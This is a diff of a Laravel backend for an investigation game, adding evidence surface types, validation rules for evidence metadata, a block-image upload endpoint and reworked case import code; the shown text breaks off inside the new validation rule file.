@@ -18,6 +18,7 @@
 │   │   ├── CaseUserStatus.php
 │   │   ├── CharacterCharge.php
 │   │   ├── CharacterStatus.php
+│   │   ├── EvidenceSurface.php
 │   │   ├── EvidenceType.php
 │   │   ├── InvestigationRequestType.php
 │   │   ├── LevelPresentationType.php
@@ -37,6 +38,7 @@
 │   │   │   │   ├── AdminEvidenceController.php
 │   │   │   │   ├── AdminInvestigationRequestController.php
 │   │   │   │   ├── AdminLevelController.php
+│   │   │   │   ├── AdminMediaController.php
 │   │   │   │   ├── AdminQuestionController.php
 │   │   │   │   ├── AdminSuspectController.php
 │   │   │   │   ├── AdminVictimController.php
@@ -51,8 +53,13 @@
 │   │   │   ├── SuspectVerdictController.php
 │   │   │   ├── VoteController.php
 │   │   │   └── WiretapController.php
-│   │   └── Middleware
-│   │       └── IsAdmin.php
+│   │   ├── Middleware
+│   │   │   └── IsAdmin.php
+│   │   └── Requests
+│   │       └── Admin
+│   │           ├── EvidenceRequestTrait.php
+│   │           ├── StoreEvidenceRequest.php
+│   │           └── UpdateEvidenceRequest.php
 │   ├── Models
 │   │   ├── Character.php
 │   │   ├── Choice.php
@@ -70,6 +77,8 @@
 │   │   └── Zone.php
 │   ├── Providers
 │   │   └── AppServiceProvider.php
+│   ├── Rules
+│   │   └── EvidenceMetadataMatchesType.php
 │   ├── Services
 │   │   ├── AssessmentService.php
 │   │   ├── GameRoomService.php
@@ -159,7 +168,9 @@
 │   │   ├── 2026_09_13_091113_rename_phases_to_zones.php
 │   │   └── 2026_09_13_142320_move_map_url_to_cases_table.php
 │   └── seeders
-│       └── DatabaseSeeder.php
+│       ├── DatabaseSeeder.php
+│       └── data
+│           └── phase1_block_documents_test_case.json
 ├── package-lock.json
 ├── package.json
 ├── phpunit.xml
@@ -492,10 +503,36 @@ enum CharacterStatus: string
 }
 </file>
 
+<file path="app/Enums/EvidenceSurface.php">
+<?php
+
+namespace App\Enums;
+
+enum EvidenceSurface: string
+{
+    case Paper = 'paper';
+    case Terminal = 'terminal';
+    case Testimony = 'testimony';
+    case Media = 'media';
+
+    public function metadataKey(): ?string
+    {
+        return match ($this) {
+            self::Paper => 'doc',
+            self::Terminal => 'terminal',
+            self::Testimony => null,
+            self::Media => null,
+        };
+    }
+}
+</file>
+
 <file path="app/Enums/EvidenceType.php">
 <?php
 
 namespace App\Enums;
+
+use App\Enums\EvidenceSurface;
 
 enum EvidenceType: string
 {
@@ -504,19 +541,27 @@ enum EvidenceType: string
     case Audio = 'audio';
     case Image = 'image';
     case Forensic = 'forensic';
+    case Digital = 'digital';
 
-    /**
-     * Optional: You can add helper methods right inside the enum
-     * to format labels for your frontend UI.
-     */
     public function label(): string
     {
-        return match($this) {
+        return match ($this) {
             self::Document => 'Written Document',
             self::Testimony => 'Witness Testimony',
             self::Audio => 'Audio Recording',
             self::Image => 'Photographic Evidence',
             self::Forensic => 'Forensic Report',
+            self::Digital => 'Digital Evidence',
+        };
+    }
+
+    public function surface(): EvidenceSurface
+    {
+        return match ($this) {
+            self::Document, self::Forensic => EvidenceSurface::Paper,
+            self::Digital => EvidenceSurface::Terminal,
+            self::Testimony => EvidenceSurface::Testimony,
+            self::Audio, self::Image => EvidenceSurface::Media,
         };
     }
 }
@@ -1515,7 +1560,7 @@ class AdminCaseController extends Controller
 
     public function store(Request $request): JsonResponse
     {
-        $validated = $request->validate([
+        $validated =$request->validate([
             'title' => 'required|string|max:255',
             'story' => 'required|string',
             'map_url' => 'nullable|string',
@@ -1535,14 +1580,13 @@ class AdminCaseController extends Controller
 
         $storeLocally = filter_var($validated['store_locally'], FILTER_VALIDATE_BOOLEAN);
 
-        $imageUrl = $this->mediaService->store(
-            $request->file('image'),
-            $validated['title'],
+        $imageUrl =$this->mediaService->store(
+            $request->file('image'),$validated['title'],
             'Cover',
             $storeLocally
         );
 
-        $tagsArray = $request->filled('tags')
+        $tagsArray =$request->filled('tags')
             ? array_map('trim', explode(',', $validated['tags']))
             : [];
 
@@ -1579,11 +1623,11 @@ class AdminCaseController extends Controller
         return response()->json(['cases' => $cases], 200);
     }
 
-    public function update(Request $request, $id): JsonResponse
+    public function update(Request $request,$id): JsonResponse
     {
         $case = GameCase::findOrFail($id);
 
-        $validated = $request->validate([
+        $validated =$request->validate([
             'title' => 'required|string|max:255',
             'story' => 'required|string',
             'map_url' => 'nullable|string',
@@ -1606,9 +1650,8 @@ class AdminCaseController extends Controller
         if ($request->hasFile('image')) {
             $this->mediaService->delete($case->getRawOriginal('img_url'));
 
-            $case->img_url = $this->mediaService->store(
-                $request->file('image'),
-                $validated['title'],
+            $case->img_url =$this->mediaService->store(
+                $request->file('image'),$validated['title'],
                 'Cover',
                 $storeLocally
             );
@@ -1642,23 +1685,23 @@ class AdminCaseController extends Controller
         $this->mediaService->delete($case->getRawOriginal('img_url'));
 
         // 2. Delete Evidence Media
-        foreach ($case->evidences as $evidence) {
+        foreach ($case->evidences as$evidence) {
             $this->mediaService->delete($evidence->getRawOriginal('img_url'));
             $this->mediaService->delete($evidence->getRawOriginal('audio_url'));
         }
 
         // 3. Delete Level and Question Media
-        foreach ($case->levels as $level) {
+        foreach ($case->levels as$level) {
             $this->mediaService->delete($level->getRawOriginal('img_url'));
 
-            foreach ($level->questions as $question) {
+            foreach ($level->questions as$question) {
                 $this->mediaService->delete($question->getRawOriginal('img_url'));
                 $this->mediaService->delete($question->getRawOriginal('audio_url'));
             }
         }
 
         // 4. Delete Character Media
-        foreach ($case->characters as $character) {
+        foreach ($case->characters as$character) {
             $this->mediaService->delete($character->getRawOriginal('img_url'));
         }
 
@@ -1673,26 +1716,79 @@ class AdminCaseController extends Controller
      */
     public function import(Request $request): JsonResponse
     {
-        $validated = $request->validate([
+        // Secure endpoint but don't bind to $validated directly for data retrieval,
+        // to prevent Laravel's aggressive key stripping from dropping our `ref_ids`.
+        $request->validate([
             'case_details' => 'required|array',
-            'evidences' => 'present|array',
+            'evidences' => ['present', 'array'],
+            'evidences.*.title' => ['required', 'string', 'max:255'],
+            'evidences.*.evidence_type' => ['required', new \Illuminate\Validation\Rules\Enum(\App\Enums\EvidenceType::class)],
+            'evidences.*.metadata' => ['nullable'],
             'characters' => 'present|array',
             'investigation_requests' => 'present|array',
             'zones' => 'present|array',
         ]);
 
-        return DB::transaction(function () use ($validated) {
+        // Access raw JSON request to bypass missing un-validated keys
+        $rawEvidences =$request->input('evidences', []);
+
+        // Validate each evidence's metadata against its evidence_type
+        // First, ensure all evidence items are arrays (not stdClass objects)
+        $evidences = array_map(function ($ev) {
+            return is_object($ev) ? (array) $ev :$ev;
+        }, $rawEvidences);
+
+        foreach ($evidences as $i =>$evData) {
+            if (!is_array($evData)) {
+                continue; // Skip invalid entries
+            }
+
+            // Ensure we can access the evidence_type
+            $evidenceType =$evData['evidence_type'] ?? null;
+            if (!$evidenceType) {
+                continue; // Skip if no evidence_type
+            }
+
+            // Cast metadata to array if it's an object
+            $metadata =$evData['metadata'] ?? null;
+            if (is_object($metadata)) {
+                $metadata = (array)$metadata;
+            }
+
+            $rule = new \App\Rules\EvidenceMetadataMatchesType;
+            // Manually set the rule's data to include this evidence's evidence_type
+            $rule->setData(['evidence_type' =>$evidenceType]);
+
+            $validator = \Illuminate\Support\Facades\Validator::make(
+                ['metadata' => $metadata],
+                ['metadata' => ['nullable', $rule]]
+            );
+
+            if ($validator->fails()) {
+                $errors =$validator->errors()->get('metadata');
+                foreach ($errors as$error) {
+                    throw new \Illuminate\Validation\ValidationException(
+                        $validator,
+                        response()->json([
+                            'message' => "Evidence #{$i}: {$error}",
+                        ], 422)
+                    );
+                }
+            }
+        }
+
+        // Gather completely raw payload for mapping
+        $importData =$request->all();
+
+        return DB::transaction(function () use ($importData) {
             // PASS 1: Master Case Creation
-            $caseData = $validated['case_details'];
-            $case = GameCase::create([
+            $caseData = $importData['case_details'];$case = GameCase::create([
                 'title' => $caseData['title'],
                 'story' => $caseData['story'],
                 'map_url' => $caseData['map_url'] ?? null,
-                'min_player_XP' => $caseData['min_player_XP'] ?? 0,
-                'XP_on_solve' => $caseData['XP_on_solve'],
+                'min_player_XP' => $caseData['min_player_XP'] ?? 0,                 'XP_on_solve' =>$caseData['XP_on_solve'],
                 'max_strikes' => $caseData['max_strikes'] ?? 3,
-                'rating_stars' => $caseData['rating_stars'] ?? 5.0,
-                'age_rating' => $caseData['age_rating'] ?? 'Unrated',
+                'rating_stars' => $caseData['rating_stars'] ?? 5.0,                 'age_rating' =>$caseData['age_rating'] ?? 'Unrated',
                 'estimated_playtime' => $caseData['estimated_playtime'] ?? null,
                 'difficulty' => $caseData['difficulty'] ?? 'Standard',
                 'tags' => $caseData['tags'] ?? [],
@@ -1710,24 +1806,20 @@ class AdminCaseController extends Controller
             ];
 
             // PASS 2: Base Entities (Evidences, Characters)
-            foreach ($validated['evidences'] as $evData) {
-                $evidence = \App\Models\Evidence::create([
+            foreach ($importData['evidences'] as $evData) {$evidence = \App\Models\Evidence::create([
                     'case_id' => $case->id,
                     'title' => $evData['title'],
                     'description' => $evData['description'] ?? null,
                     'evidence_type' => $evData['evidence_type'],
-                    'sub_type' => $evData['sub_type'] ?? null,
                     'metadata' => $evData['metadata'] ?? null,
                     'is_initial' => $evData['is_initial'] ?? false,
                     'is_vital_for_conviction' => $evData['is_vital_for_conviction'] ?? false,
                 ]);
-                if (isset($evData['ref_id'])) {
-                    $refMaps['evidence'][$evData['ref_id']] = $evidence->id;
+                if (isset($evData['ref_id'])) {$refMaps['evidence'][$evData['ref_id']] =$evidence->id;
                 }
             }
 
-            foreach ($validated['characters'] as $charData) {
-                $character = \App\Models\Character::create([
+            foreach ($importData['characters'] as $charData) {$character = \App\Models\Character::create([
                     'case_id' => $case->id,
                     'name' => $charData['name'],
                     'background' => $charData['background'] ?? null,
@@ -1736,17 +1828,14 @@ class AdminCaseController extends Controller
                     'charge' => $charData['charge'] ?? null,
                     'default_status' => $charData['default_status'] ?? 'available',
                 ]);
-                if (isset($charData['ref_id'])) {
-                    $refMaps['character'][$charData['ref_id']] = $character->id;
+                if (isset($charData['ref_id'])) {$refMaps['character'][$charData['ref_id']] =$character->id;
                 }
             }
 
             // PASS 3: Zones and Levels
-            $levelDataWithRefs = [];
-            $zonesDataArray = [];
+            $levelDataWithRefs = [];$zonesDataArray = [];
 
-            foreach ($validated['zones'] as $zoneData) {
-                $zone = \App\Models\Zone::create([
+            foreach ($importData['zones'] as $zoneData) {$zone = \App\Models\Zone::create([
                     'case_id' => $case->id,
                     'title' => $zoneData['title'],
                     'description' => $zoneData['description'] ?? null,
@@ -1756,8 +1845,7 @@ class AdminCaseController extends Controller
                     'coord_y' => $zoneData['coord_y'] ?? null,
                 ]);
 
-                foreach ($zoneData['levels'] as $lvlData) {
-                    $level = \App\Models\Level::create([
+                foreach ($zoneData['levels'] as $lvlData) {$level = \App\Models\Level::create([
                         'zone_id' => $zone->id,
                         'title' => $lvlData['title'],
                         'details' => $lvlData['details'],
@@ -1767,8 +1855,7 @@ class AdminCaseController extends Controller
                         'required_request_id' => null,
                     ]);
 
-                    if (isset($lvlData['ref_id'])) {
-                        $refMaps['level'][$lvlData['ref_id']] = $level->id;
+                    if (isset($lvlData['ref_id'])) {$refMaps['level'][$lvlData['ref_id']] =$level->id;
                     }
 
                     $levelDataWithRefs[] = [
@@ -1784,60 +1871,52 @@ class AdminCaseController extends Controller
             }
 
             // PASS 4: Investigation Requests (Mapping unlocks to the levels we just created)
-            foreach ($validated['investigation_requests'] as $reqData) {
-                $req = \App\Models\InvestigationRequest::create([
+            foreach ($importData['investigation_requests'] as $reqData) {$req = \App\Models\InvestigationRequest::create([
                     'case_id' => $case->id,
                     'request_type' => $reqData['request_type'],
                     'unlocks_evidence_id' => isset($reqData['unlocks_evidence_ref']) && isset($refMaps['evidence'][$reqData['unlocks_evidence_ref']]) ? $refMaps['evidence'][$reqData['unlocks_evidence_ref']] : null,
                     'unlocks_level_id' => isset($reqData['unlocks_level_ref']) && isset($refMaps['level'][$reqData['unlocks_level_ref']]) ? $refMaps['level'][$reqData['unlocks_level_ref']] : null,
                 ]);
 
-                if (isset($reqData['ref_id'])) {
-                    $refMaps['request'][$reqData['ref_id']] = $req->id;
+                if (isset($reqData['ref_id'])) {$refMaps['request'][$reqData['ref_id']] =$req->id;
                 }
 
-                if (!empty($reqData['required_evidence_refs'])) {
-                    $evIds = array_map(fn($ref) => $refMaps['evidence'][$ref] ?? null, $reqData['required_evidence_refs']);
+                if (!empty($reqData['required_evidence_refs'])) {$evIds = array_map(fn($ref) =>$refMaps['evidence'][$ref] ?? null, $reqData['required_evidence_refs']);
                     $req->requiredEvidences()->sync(array_filter($evIds));
                 }
             }
 
             // PASS 5: Update Levels with their required Investigation Requests
-            foreach ($levelDataWithRefs as $ldata) {
-                if ($ldata['req_ref'] && isset($refMaps['request'][$ldata['req_ref']])) {
-                    \App\Models\Level::where('id', $ldata['level_id'])->update([
+            foreach ($levelDataWithRefs as$ldata) {
+                if ($ldata['req_ref'] && isset($refMaps['request'][$ldata['req_ref']])) {                     \App\Models\Level::where('id',$ldata['level_id'])->update([
                         'required_request_id' => $refMaps['request'][$ldata['req_ref']]
                     ]);
                 }
             }
 
             // PASS 6: Questions and Choices
-            foreach ($zonesDataArray as $ldata) {
-                $nodeIndexMap = []; // Maps JSON node array index to actual question DB ID
+            foreach ($zonesDataArray as $ldata) {$nodeIndexMap = []; // Maps JSON node array index to actual question DB ID
 
                 // Sub-Pass A: Insert Questions First (to generate IDs for dialogue trees)
-                foreach ($ldata['nodes'] as $index => $nodeData) {
-                    $question = \App\Models\Question::create([
+                foreach ($ldata['nodes'] as$index => $nodeData) {$question = \App\Models\Question::create([
                         'level_id' => $ldata['level_id'],
                         'text' => $nodeData['text'],
                     ]);
-                    $nodeIndexMap[$index] = $question->id;
+                    $nodeIndexMap[$index] =$question->id;
                 }
 
                 // Sub-Pass B: Insert Choices and connect internal routing
-                foreach ($ldata['nodes'] as $index => $nodeData) {
-                    $questionId = $nodeIndexMap[$index];
+                foreach ($ldata['nodes'] as$index => $nodeData) {$questionId = $nodeIndexMap[$index];
 
-                    foreach ($nodeData['choices'] as $choiceData) {
-                        $outcomes = $choiceData['outcomes'] ?? [];
-                        $requirements = $choiceData['requirements'] ?? [];
+                    foreach ($nodeData['choices'] as$choiceData) {
+                        $outcomes =$choiceData['outcomes'] ?? [];
+                        $requirements =$choiceData['requirements'] ?? [];
 
                         // Build Outcomes Array
                         $mappedOutcomes = [];
-                        if (isset($outcomes['feedback'])) $mappedOutcomes['feedback'] = $outcomes['feedback'];
-                        if (isset($outcomes['gives_strike'])) $mappedOutcomes['gives_strike'] = $outcomes['gives_strike'];
-                        if (isset($outcomes['next_question_index']) && $outcomes['next_question_index'] !== null) {
-                            $mappedOutcomes['next_question_id'] = $nodeIndexMap[$outcomes['next_question_index']] ?? null;
+                        if (isset($outcomes['feedback'])) $mappedOutcomes['feedback'] =$outcomes['feedback'];
+                        if (isset($outcomes['gives_strike'])) $mappedOutcomes['gives_strike'] =$outcomes['gives_strike'];
+                        if (isset($outcomes['next_question_index']) && $outcomes['next_question_index'] !== null) {$mappedOutcomes['next_question_id'] = $nodeIndexMap[$outcomes['next_question_index']] ?? null;
                         }
 
                         $mapRefs = function($refs, $type) use ($refMaps) {
@@ -1845,44 +1924,39 @@ class AdminCaseController extends Controller
                             return array_values(array_filter(array_map(fn($r) => $refMaps[$type][$r] ?? null, $refs)));
                         };
 
-                        if (!empty($outcomes['unlock_evidence_refs'])) $mappedOutcomes['unlock_evidence'] = $mapRefs($outcomes['unlock_evidence_refs'], 'evidence');
-                        if (!empty($outcomes['unlock_levels_refs'])) $mappedOutcomes['unlock_levels'] = $mapRefs($outcomes['unlock_levels_refs'], 'level');
+                        if (!empty($outcomes['unlock_evidence_refs']))$mappedOutcomes['unlock_evidence'] = $mapRefs($outcomes['unlock_evidence_refs'], 'evidence');
+                        if (!empty($outcomes['unlock_levels_refs']))$mappedOutcomes['unlock_levels'] = $mapRefs($outcomes['unlock_levels_refs'], 'level');
 
                         // Map the dynamic character updates array
-                        if (!empty($outcomes['character_updates']) && is_array($outcomes['character_updates'])) {
-                            $mappedCharUpdates = [];
-                            foreach ($outcomes['character_updates'] as $update) {
-                                if (isset($update['ref_id']) && isset($refMaps['character'][$update['ref_id']])) {
-                                    $mappedUpdate = ['id' => $refMaps['character'][$update['ref_id']]];
-                                    if (isset($update['is_unlocked'])) $mappedUpdate['is_unlocked'] = $update['is_unlocked'];
-                                    if (isset($update['status'])) $mappedUpdate['status'] = $update['status'];
-                                    $mappedCharUpdates[] = $mappedUpdate;
+                        if (!empty($outcomes['character_updates']) && is_array($outcomes['character_updates'])) {$mappedCharUpdates = [];
+                            foreach ($outcomes['character_updates'] as$update) {
+                                if (isset($update['ref_id']) && isset($refMaps['character'][$update['ref_id']])) {$mappedUpdate = ['id' => $refMaps['character'][$update['ref_id']]];
+                                    if (isset($update['is_unlocked'])) $mappedUpdate['is_unlocked'] =$update['is_unlocked'];
+                                    if (isset($update['status'])) $mappedUpdate['status'] =$update['status'];
+                                    $mappedCharUpdates[] =$mappedUpdate;
                                 }
                             }
                             if (!empty($mappedCharUpdates)) {
-                                $mappedOutcomes['character_updates'] = $mappedCharUpdates;
+                                $mappedOutcomes['character_updates'] =$mappedCharUpdates;
                             }
                         }
 
                         // Build Requirements Array
                         $mappedReqs = [];
-                        if (!empty($requirements['required_evidence_refs'])) {
-                            $mappedReqs['required_evidence'] = $mapRefs($requirements['required_evidence_refs'], 'evidence');
+                        if (!empty($requirements['required_evidence_refs'])) {$mappedReqs['required_evidence'] = $mapRefs($requirements['required_evidence_refs'], 'evidence');
                         }
-                        if (!empty($requirements['required_choice_refs'])) {
-                            $mappedReqs['required_choices'] = $mapRefs($requirements['required_choice_refs'], 'choice');
+                        if (!empty($requirements['required_choice_refs'])) {$mappedReqs['required_choices'] = $mapRefs($requirements['required_choice_refs'], 'choice');
                         }
 
                         // Create choice so Eloquent arrays are casted to JSON properly and we retrieve the auto-increment ID
                         $choice = \App\Models\Choice::create([
                             'question_id' => $questionId,
                             'text' => $choiceData['text'],
-                            'outcomes' => !empty($mappedOutcomes) ? $mappedOutcomes : null,
-                            'requirements' => !empty($mappedReqs) ? $mappedReqs : null,
+                            'outcomes' => !empty($mappedOutcomes) ?$mappedOutcomes : null,
+                            'requirements' => !empty($mappedReqs) ?$mappedReqs : null,
                         ]);
 
-                        if (isset($choiceData['ref_id'])) {
-                            $refMaps['choice'][$choiceData['ref_id']] = $choice->id;
+                        if (isset($choiceData['ref_id'])) {$refMaps['choice'][$choiceData['ref_id']] =$choice->id;
                         }
                     }
                 }
@@ -1903,33 +1977,20 @@ class AdminCaseController extends Controller
 namespace App\Http\Controllers\Admin;
 
 use App\Http\Controllers\Controller;
+use App\Http\Requests\Admin\StoreEvidenceRequest;
+use App\Http\Requests\Admin\UpdateEvidenceRequest;
 use App\Services\MediaService;
 use App\Models\Evidence;
 use App\Models\GameCase;
-use App\Enums\EvidenceType;
-use Illuminate\Http\Request;
 use Illuminate\Http\JsonResponse;
-use Illuminate\Validation\Rules\Enum;
 
 class AdminEvidenceController extends Controller
 {
     public function __construct(private readonly MediaService $mediaService) {}
 
-    public function store(Request $request): JsonResponse
+    public function store(StoreEvidenceRequest $request): JsonResponse
     {
-        $validated = $request->validate([
-            'case_id' => 'required|exists:cases,id',
-            'title' => 'required|string|max:255',
-            'description' => 'nullable|string',
-            'evidence_type' => ['required', new Enum(EvidenceType::class)],
-            'sub_type' => 'nullable|string',
-            'metadata' => 'nullable|string',
-            'is_initial' => 'required|boolean',
-            'is_vital_for_conviction' => 'required|boolean',
-            'image' => 'nullable|image|mimes:jpeg,png,jpg,webp|max:4096',
-            'audio' => 'nullable|file|mimes:mp3,wav,ogg|max:10240',
-            'store_locally' => 'required|boolean',
-        ]);
+        $validated = $request->validated();
 
         $storeLocally = filter_var($validated['store_locally'], FILTER_VALIDATE_BOOLEAN);
         $caseTitle = GameCase::where('id', $validated['case_id'])->value('title') ?? 'General';
@@ -1939,7 +2000,9 @@ class AdminEvidenceController extends Controller
 
         $metadataPayload = null;
         if (!empty($validated['metadata'])) {
-            $metadataPayload = json_decode($validated['metadata'], true);
+            $metadataPayload = is_string($validated['metadata'])
+                ? json_decode($validated['metadata'], true)
+                : $validated['metadata'];
         }
 
         $evidence = Evidence::create([
@@ -1947,7 +2010,6 @@ class AdminEvidenceController extends Controller
             'title' => $validated['title'],
             'description' => $validated['description'] ?? null,
             'evidence_type' => $validated['evidence_type'],
-            'sub_type' => $validated['sub_type'] ?? null,
             'metadata' => $metadataPayload,
             'is_initial' => $validated['is_initial'],
             'is_vital_for_conviction' => $validated['is_vital_for_conviction'],
@@ -1958,30 +2020,20 @@ class AdminEvidenceController extends Controller
         return response()->json(['message' => 'Evidence added successfully.', 'evidence' => $evidence], 201);
     }
 
-    public function update(Request $request, $id): JsonResponse
+    public function update(UpdateEvidenceRequest $request, $id): JsonResponse
     {
         $evidence = Evidence::findOrFail($id);
 
-        $validated = $request->validate([
-            'case_id' => 'required|exists:cases,id',
-            'title' => 'required|string|max:255',
-            'description' => 'nullable|string',
-            'evidence_type' => ['required', new Enum(EvidenceType::class)],
-            'sub_type' => 'nullable|string',
-            'metadata' => 'nullable|string',
-            'is_initial' => 'required|boolean',
-            'is_vital_for_conviction' => 'required|boolean',
-            'image' => 'nullable|image|mimes:jpeg,png,jpg,webp|max:4096',
-            'audio' => 'nullable|file|mimes:mp3,wav,ogg|max:10240',
-            'store_locally' => 'required|boolean',
-        ]);
+        $validated = $request->validated();
 
         $storeLocally = filter_var($validated['store_locally'], FILTER_VALIDATE_BOOLEAN);
         $caseTitle = GameCase::where('id', $validated['case_id'])->value('title') ?? 'General';
 
         $metadataPayload = null;
         if (!empty($validated['metadata'])) {
-            $metadataPayload = json_decode($validated['metadata'], true);
+            $metadataPayload = is_string($validated['metadata'])
+                ? json_decode($validated['metadata'], true)
+                : $validated['metadata'];
         }
 
         $updateData = [
@@ -1989,7 +2041,6 @@ class AdminEvidenceController extends Controller
             'title' => $validated['title'],
             'description' => $validated['description'] ?? null,
             'evidence_type' => $validated['evidence_type'],
-            'sub_type' => $validated['sub_type'] ?? null,
             'metadata' => $metadataPayload,
             'is_initial' => $validated['is_initial'],
             'is_vital_for_conviction' => $validated['is_vital_for_conviction'],
@@ -2214,6 +2265,63 @@ class AdminLevelController extends Controller
             ->get();
 
         return response()->json($levels, 200);
+    }
+}
+</file>
+
+<file path="app/Http/Controllers/Admin/AdminMediaController.php">
+<?php
+
+namespace App\Http\Controllers\Admin;
+
+use App\Http\Controllers\Controller;
+use App\Services\MediaService;
+use App\Models\GameCase;
+use Illuminate\Http\Request;
+use Illuminate\Http\JsonResponse;
+
+/**
+ * Standalone media endpoint for assets that are NOT the evidence's own
+ * `img_url` / `audio_url` columns.
+ *
+ * Phase 1 moved every paper artefact onto the block model, and an `image` block
+ * carries its own `props.url` inside `metadata.doc`. Those URLs are authored one
+ * block at a time in the admin builder, long before the evidence row that will
+ * eventually hold the document is saved -- so they cannot ride along with the
+ * `store` / `update` form post. This endpoint is what the builder's image
+ * inspector calls instead.
+ *
+ * Orphan policy is deliberately unchanged from the rest of the app: the
+ * returned URL is persisted into the block on success, and a builder the author
+ * abandons simply leaves an unreferenced file behind, exactly as an abandoned
+ * evidence upload already does.
+ */
+class AdminMediaController extends Controller
+{
+    public function __construct(private readonly MediaService $mediaService) {}
+
+    public function storeBlockImage(Request $request): JsonResponse
+    {
+        $validated = $request->validate([
+            'case_id' => 'required|exists:cases,id',
+            'image' => 'required|image|mimes:jpeg,png,jpg,webp|max:4096',
+            'store_locally' => 'required|boolean',
+        ]);
+
+        $storeLocally = filter_var($validated['store_locally'], FILTER_VALIDATE_BOOLEAN);
+        $caseTitle = GameCase::where('id', $validated['case_id'])->value('title') ?? 'General';
+
+        $url = $this->mediaService->store(
+            $request->file('image'),
+            $caseTitle,
+            'Evidences/Blocks',
+            $storeLocally
+        );
+
+        return response()->json([
+            'message' => 'Block image uploaded successfully.',
+            'url' => $url,
+        ], 201);
     }
 }
 </file>
@@ -2631,6 +2739,112 @@ class IsAdmin
 }
 </file>
 
+<file path="app/Http/Requests/Admin/EvidenceRequestTrait.php">
+<?php
+
+namespace App\Http\Requests\Admin;
+
+use App\Enums\EvidenceType;
+use App\Rules\EvidenceMetadataMatchesType;
+use Illuminate\Validation\Rules\Enum;
+
+trait EvidenceRequestTrait
+{
+    protected function evidenceRules(): array
+    {
+        return [
+            'case_id' => ['required', 'exists:cases,id'],
+            'title' => ['required', 'string', 'max:255'],
+            'description' => ['nullable', 'string'],
+            'evidence_type' => ['required', new Enum(EvidenceType::class)],
+            'metadata' => ['nullable', new EvidenceMetadataMatchesType],
+            'is_initial' => ['required', 'boolean'],
+            'is_vital_for_conviction' => ['required', 'boolean'],
+            'image' => ['nullable', 'image', 'mimes:jpeg,png,jpg,webp', 'max:4096'],
+            'audio' => ['nullable', 'file', 'mimes:mp3,wav,ogg', 'max:10240'],
+            'store_locally' => ['required', 'boolean'],
+        ];
+    }
+}
+</file>
+
+<file path="app/Http/Requests/Admin/StoreEvidenceRequest.php">
+<?php
+
+namespace App\Http\Requests\Admin;
+
+use App\Enums\EvidenceType;
+use App\Rules\EvidenceMetadataMatchesType;
+use Illuminate\Foundation\Http\FormRequest;
+use Illuminate\Validation\Rules\Enum;
+
+class StoreEvidenceRequest extends FormRequest
+{
+    /**
+     * Determine if the user is authorized to make this request.
+     */
+    public function authorize(): bool
+    {
+        return true;
+    }
+
+    /**
+     * Get the validation rules that apply to the request.
+     *
+     * @return array<string, \Illuminate\Contracts\Validation\ValidationRule|array<mixed>|string>
+     */
+    public function rules(): array
+    {
+        return [
+            'case_id' => ['required', 'exists:cases,id'],
+            'title' => ['required', 'string', 'max:255'],
+            'description' => ['nullable', 'string'],
+            'evidence_type' => ['required', new Enum(EvidenceType::class)],
+            'metadata' => ['nullable', new EvidenceMetadataMatchesType],
+            'is_initial' => ['required', 'boolean'],
+            'is_vital_for_conviction' => ['required', 'boolean'],
+            'image' => ['nullable', 'image', 'mimes:jpeg,png,jpg,webp', 'max:4096'],
+            'audio' => ['nullable', 'file', 'mimes:mp3,wav,ogg', 'max:10240'],
+            'store_locally' => ['required', 'boolean'],
+        ];
+    }
+}
+</file>
+
+<file path="app/Http/Requests/Admin/UpdateEvidenceRequest.php">
+<?php
+
+namespace App\Http\Requests\Admin;
+
+use App\Enums\EvidenceType;
+use App\Rules\EvidenceMetadataMatchesType;
+use Illuminate\Foundation\Http\FormRequest;
+use Illuminate\Validation\Rules\Enum;
+
+class UpdateEvidenceRequest extends FormRequest
+{
+    use \App\Http\Requests\Admin\EvidenceRequestTrait;
+
+    /**
+     * Determine if the user is authorized to make this request.
+     */
+    public function authorize(): bool
+    {
+        return true;
+    }
+
+    /**
+     * Get the validation rules that apply to the request.
+     *
+     * @return array<string, \Illuminate\Contracts\Validation\ValidationRule|array<mixed>|string>
+     */
+    public function rules(): array
+    {
+        return $this->evidenceRules();
+    }
+}
+</file>
+
 <file path="app/Models/Character.php">
 <?php
 
@@ -2734,7 +2948,6 @@ class Evidence extends Model
         'title',
         'description',
         'evidence_type',
-        'sub_type',
         'metadata',
         'audio_url',
         'img_url',
@@ -3309,6 +3522,123 @@ class AppServiceProvider extends ServiceProvider
     public function boot(): void
     {
         //
+    }
+}
+</file>
+
+<file path="app/Rules/EvidenceMetadataMatchesType.php">
+<?php
+
+namespace App\Rules;
+
+use App\Enums\EvidenceSurface;
+use App\Enums\EvidenceType;
+use Closure;
+use Illuminate\Contracts\Validation\ValidationRule;
+
+class EvidenceMetadataMatchesType implements ValidationRule
+{
+    private const SURFACE_BLOCKS = [
+        'paper' => [
+            'letterhead', 'meta_grid', 'prose', 'two_column', 'table', 'list',
+            'signature_row', 'stamp', 'barcode', 'watermark', 'rule', 'spacer',
+            'image', 'annotation', 'redaction', 'diagram',
+        ],
+        'terminal' => [
+            'prompt_line', 'output_stream', 'status_banner', 'encryption_flow',
+            'hash_matrix', 'file_tree', 'ascii_panel', 'packet_trace', 'spacer',
+        ],
+    ];
+
+    private array $customData = [];
+
+    public function setData(array $data): void
+    {
+        $this->customData = $data;
+    }
+
+    /**
+     * Run the validation rule.
+     *
+     * @param  \Closure(string, ?string=): \Illuminate\Translation\PotentiallyTranslatedString  $fail
+     */
+    public function validate(string $attribute, mixed $value, Closure $fail): void
+    {
+        $inputData = $this->customData ?: ($this->data ?? []);
+        $evidenceTypeStr = $inputData['evidence_type'] ?? null;
+
+        if (!$evidenceTypeStr) {
+            return;
+        }
+
+        try {
+            $evidenceType = EvidenceType::from($evidenceTypeStr);
+        } catch (\ValueError) {
+            return;
+        }
+
+        $surface = $evidenceType->surface();
+        $metadata = is_string($value) ? json_decode($value, true) : $value;
+
+        // Handle both array and object (stdClass) structures
+        if (is_object($metadata)) {
+            $metadata = (array) $metadata;
+        }
+
+        if (json_last_error() !== JSON_ERROR_NONE) {
+            $fail('Metadata is not valid JSON.');
+            return;
+        }
+
+        if (!is_array($metadata)) {
+            return;
+        }
+
+        $foreignKey = null;
+        foreach (EvidenceSurface::cases() as $s) {
+            if ($s !== $surface && $s->metadataKey() !== null) {
+                $foreignKey = $s->metadataKey();
+                break;
+            }
+        }
+
+        if ($foreignKey && isset($metadata[$foreignKey])) {
+            $fail("A {$evidenceType->value} evidence cannot carry metadata.{$foreignKey}.");
+            return;
+        }
+
+        $key = $surface->metadataKey();
+
+        if ($key !== null) {
+            $doc = $metadata[$key] ?? null;
+
+            // Handle both array and object (stdClass) structures
+            if (is_object($doc)) {
+                $doc = (array) $doc;
+            }
+
